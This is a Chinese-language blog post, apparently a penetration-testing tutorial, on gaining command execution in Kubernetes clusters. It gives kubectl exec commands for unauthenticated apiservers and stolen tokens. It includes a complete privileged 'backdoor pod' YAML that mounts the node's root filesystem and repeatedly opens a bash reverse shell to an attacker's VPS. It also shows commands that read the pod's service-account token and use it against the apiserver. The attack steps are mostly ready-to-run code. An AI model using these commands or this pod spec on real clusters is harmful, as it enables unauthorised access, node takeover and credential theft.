<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>K8s渗透-执行 | My Hugo Knowledgebase</title>

    <link rel="stylesheet" href="/css/main.css">


      <script src="/js/main.js"></script>


</head>
<body>
  <header>
    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
    Theme
  </button>
</div>

  </header>
  <main>
    
  <h1>K8s渗透-执行</h1>

  
  
  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>

  <h1 id="k8s渗透-执行">K8s渗透-执行</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>执行阶段的主要任务是实现在集群内执行任意命令，获得shell</p>
<h2 id="kubectl-exec进入容器">kubectl exec进入容器</h2>
<p>当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># apiserver未授权时</span>
</span></span><span style="display:flex;"><span>kubectl -s x.x.x.x:8080 --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到kubeconfig文件时</span>
</span></span><span style="display:flex;"><span>kubectl --kubeconfig config --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到高权限token时</span>
</span></span><span style="display:flex;"><span>kubectl --server<span style="color:#f92672">=</span>https://x.x.x.x:6443 --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;token值&gt;&#34;</span> --insecure-skip-tls-verify --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span></code></pre></div><p>比如这里进入容器执行反弹shell命令</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png" alt="QQ_1755101935584"></p>
<p>成功监听到反弹shell：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png" alt="QQ_1755101972156"></p>
<h2 id="创建后门pod">创建后门pod</h2>
<p>获取初始访问权限后，通过创建后门pod来执行后续攻击，</p>
<p>首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">args</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;-c&#34;</span>
</span></span><span style="display:flex;"><span>      - |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span></code></pre></div><p>然后使用 kubectl 创建文件指定的恶意容器：</p>
<pre tabindex="0"><code>kubectl -s x.x.x.x:8080 create -f test.yaml
</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337573510-20250714002417620.png" alt="QQ_1752337573510"></p>
<blockquote>
<p><strong>注意</strong>，这里如果想要指定在哪个node上创建容器（只有状态为ready的node可以创建并running），可以直接在yaml中增加nodeName字段：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span><span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span></code></pre></div><p>我们其实也可以通过上面提到的kubectl exec直接进入容器的shell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl -s x.x.x.x:8080 --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
</span></span></code></pre></div></blockquote>
<p>在创建成功后，容器会自动向我们监听的vps反弹shell：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337659881-20250714002417907.png" alt="QQ_1752337659881"></p>
<p>因为我们将节点的根目录挂载到了容器的<code>/mnt</code>目录，所以我们可以通过操作pod的<code>/mnt</code>目录来操作node的根目录：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714002609563.png" alt="QQ_1752337790318"></p>
<h2 id="服务账号连接api-server执行指令">服务账号连接API Server执行指令</h2>
<p>k8s的账号分为用户账号和服务账号，用户账号提供给用户来操作集群，服务账号用于pod中运行的进程，为pod中运行的应用或服务提供身份，由k8s API自动创建并由API server进行认证，k8s的pod中默认携带服务账号的访问凭证，每个服务账号均会自动关联一个API访问令牌，那么如果我们控制的pod中存在高权限的服务账号，我们就可以在pod中通过该账号凭证向k8s下发指令</p>
<p>服务账号在pod内的默认路径如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/var/run/secrets/kubernetes.io/serviceaccount/
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755186066353.png" alt="QQ_1755186066353"></p>
<p>我们可以携带这里的token向apiserver发送一个SelfSubjectRulesReview请求，可以知道当前服务账号在指定命名空间（这里以default为例）的操作权限：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>CA_CERT<span style="color:#f92672">=</span>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
</span></span><span style="display:flex;"><span>NAMESPACE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/namespace<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -sk --header <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> --cacert $CA_CERT -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -X POST https://x.x.x.x:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d <span style="color:#e6db74">&#39;{&#34;kind&#34;:&#34;SelfSubjectRulesReview&#34;,&#34;apiVersion&#34;:&#34;authorization.k8s.io/v1&#34;,&#34;spec&#34;:{&#34;namespace&#34;:&#34;default&#34;}}&#39;</span>
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755339078336.png" alt="QQ_1755339078336"></p>
<p>如果返回的json中列出来是较高的权限，我们可以使用这个服务账户的token来远程控制apiserver（网传可以curl请求apiserver的借口来执行命令，但我失败了，似乎是因为这里不能使用常规http来请求借口，而需要SPDY或者websocket，所以我认为使用kubectl来完成对kubectl的控制更方便）：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755343454008.png" alt="QQ_1755343454008"></p>
<p>那么后面的操作就和上文一样，可以创建后门pod并挂载node根目录实现对node节点的访问或者逃逸（逃逸在后面的文章总结）</p>
<h2 id="未开启rbac权限">未开启RBAC权限</h2>
<p>RBAC(Role-Based Access Control)是k8s中用于控制访问权限的一种策略，它允许管理员定义角色和角色绑定，以及分配这些角色给用户或服务账号，以此来限制他们对集群的访问和操作权限</p>
<p>我们可以通过在master节点上执行命令，查看apiserver的启动参数是否有<code>--authorization-mode=RBAC</code>，以此查看是否开启了RBAC权限：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization-mode
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755358930320.png" alt="QQ_1755358930320"></p>
<p>或者：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps -ef | grep authorization-mode
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755359606268.png" alt="QQ_1755359606268"></p>
<p>只要有这个参数，则代表开启了RBAC权限</p>
<p>如果没有开启RBAC权限，代表我们可以使用k8s中任意经过认证的token实现对k8s apiserver的控制，那么思路就和上面连接API server执行是一样的了，当我们获得了pod的shell，可以尝试读取<code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>获得token，然后直接使用curl或者kubectl调用apiserver，创建后门pod并逃逸来控制节点</p>
<h2 id="不安全的容器镜像">不安全的容器镜像</h2>
<p>这个在前面文章k8s面临的风险中也提到过，如果容器本身存在漏洞，则很容易成为入口点，比如笔者遇到过的一个攻防场景，pod上运行的zabbix在公网存在弱口令，进入后台可以RCE导致pod被接管，后续进行一系列横向和逃逸，成功接管了整个k8s</p>
<h2 id="总结">总结</h2>
<p>从上面的这些方法来看，执行这一步的目标就利用传统安全漏洞、token、apiserver原有命令等手段，在pod上实现命令执行或者能够获得apiserver的控制权，为接下来的权限提升（即逃逸）做准备</p>

  


  </main>
  <footer>
    <p>Copyright 2025. All rights reserved.</p>

  </footer>
</body>
</html>
